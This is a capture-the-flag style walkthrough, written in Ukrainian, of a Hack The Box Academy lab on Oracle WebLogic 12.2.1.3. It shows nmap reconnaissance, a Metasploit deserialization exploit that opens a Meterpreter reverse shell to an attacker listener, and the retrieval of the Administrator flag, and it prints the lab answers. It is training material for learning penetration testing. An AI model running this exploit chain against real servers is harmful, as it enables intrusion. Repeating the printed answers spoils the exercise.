Attacking Common Applications — Other Notable Applications (WebLogic)
=====================================================================

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Other Notable Applications](https://academy.hackthebox.com/app/module/113/section/1102)
Ціль: `10.129.201.102`

Ідея атаки
----------

На хості `10.129.201.102`:
- працює Windows з купою сервісів (FTP, IIS, SMB, RPC, WinRM);
- на порту `7001/tcp` запущено Oracle WebLogic admin HTTPd 12.2.1.3 (T3 включено);
- завдання –:
  - Q1: визначити застосунок → **WebLogic**;
  - Q2: знайти вразливість WebLogic, отримати RCE та прочитати `C:\Users\Administrator\Desktop\flag.txt`.

Крок 1 — Первинний nmap‑скан
-----------------------------

На атакуючій машині:

```bash
nmap -p- -sC -sV --open --min-rate 1000 10.129.201.102
```

Важливі результати:

- `21/tcp  open  ftp Microsoft ftpd` + анонімний FTP (`ftp-anon: Anonymous FTP login allowed`)
- `80/tcp  open  http Microsoft IIS httpd 10.0`
- `443/tcp open  ssl/http Microsoft IIS httpd 10.0`
- `5985/tcp open http Microsoft HTTPAPI httpd 2.0` (WinRM)
- `7001/tcp open http Oracle WebLogic admin httpd 12.2.1.3 (T3 enabled)`

Висновок для Q1:

- ключовий застосунок – **Oracle WebLogic Server** (адміністративна консоль на 7001);
- відповідь HTB на Q1 – коротко: `WebLogic`.

Крок 2 — Вибір вектора атаки (WebLogic RCE)
-------------------------------------------

З огляду на завдання «Other Notable Applications» і банер WebLogic:

- WebLogic має багато RCE через Java десеріалізацію (`BadAttributeValueExpException` та інші CVE‑2020‑*).  
- Найзручніше взяти готовий Metasploit‑модуль, який уже адаптований для WebLogic 12.2.1.3.

У цій лабі працює:

- `exploit/multi/misc/weblogic_deserialize_badattrval` (WebLogic Server Deserialization RCE - BadAttributeValueExpException).

Крок 3 — Запускаємо Metasploit
------------------------------

```bash
msfconsole -q
```

Перемикаємось на потрібний модуль:

```bash
use exploit/multi/misc/weblogic_deserialize_badattrval
show options
```

Бачимо, що модулю потрібні:

- `RHOSTS` – IP WebLogic;
- `RPORT` – порт WebLogic (стандартно 7001);
- `LHOST` – наш HTB VPN IP;
- опціонально `SRVHOST/SRVPORT` для staging (залишаємо дефолтні).

Крок 4 — Налаштування параметрів модуля
---------------------------------------

Виставляємо ціль:

```bash
set RHOSTS 10.129.201.102
set RPORT 7001
```

Виставляємо наш listener:

```bash
set LHOST 10.10.14.103
set LPORT 4444
```

Перевіряємо:

```bash
show options
```

Має бути:

- `RHOSTS => 10.129.201.102`
- `RPORT  => 7001`
- `LHOST  => 10.10.14.103`
- `LPORT  => 4444`

Важливо:

- не змішувати `RHOST`/`RHOSTS`;
- переконатись, що `nc -zv 10.129.201.102 7001` показує, що порт доступний.

Крок 5 — Експлуатація WebLogic (BadAttributeValueExpException RCE)
------------------------------------------------------------------

Запускаємо експлойт:

```bash
exploit
```

Типовий вивід (як у тебе):

```text
[*] Started reverse TCP handler on 10.10.14.103:4444 
[*] 10.129.201.102:7001 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.129.201.102:7001 - WebLogic version detected: 12.2.1.3.0
[+] 10.129.201.102:7001 - The target appears to be vulnerable.
[*] 10.129.201.102:7001 - Sending handshake...
[*] 10.129.201.102:7001 - Formatting payload...
[*] 10.129.201.102:7001 - Sending object...
[*] Sending stage (190534 bytes) to 10.129.201.102
[*] Meterpreter session 1 opened (10.10.14.103:4444 -> 10.129.201.102:49690) ...
```

Фактично:

- модуль робить десеріалізацію через WebLogic‑сервіс;
- код виконується в контексті WebLogic‑процесу на Windows;
- Metasploit завозить `meterpreter` payload, відкривається сеанс.

Крок 6 — Перехід у Meterpreter і перехід до Administrator Desktop
-----------------------------------------------------------------

Підключаємось до сесії:

```bash
sessions
sessions -i 1
```

Перевіряємо директорію:

```bash
pwd
```

Потім переходимо на десктоп Administrator:

```bash
cd C:/Users/Administrator/Desktop
ls
```

Очікуваний список (як у тебе):

```text
WebLogic_Admin_WinSvc_Install.cmd
desktop.ini
flag.txt
```

Крок 7 — Знімаємо flag.txt
--------------------------

У Meterpreter:

```bash
cat flag.txt
```

Лаба дає:

```text
w3b_l0gic_RCE!
```

Це і є шуканий флаг для Q2.

Як запасний варіант:

```bash
download flag.txt .
cat flag.txt
```

або:

```bash
shell
type C:\Users\Administrator\Desktop\flag.txt
```

Відповіді
---------

**Q1:** WebLogic  
**Q2:** `w3b_l0gic_RCE!`

Що тут було вразливим
---------------------

- WebLogic 12.2.1.3 має десеріалізаційні RCE (BadAttributeValueExpException), які дозволяють виконання довільного коду через мережу.
- Адмін‑інтерфейс слухає на зовнішньому порту 7001 без додаткових обмежень (ACL, VPN, IP‑фільтрації).
- Використання Metasploit‑модуля `weblogic_deserialize_badattrval` дає стабільний Meterpreter у контексті WebLogic‑процесу, що дозволяє читати файли Administrator.
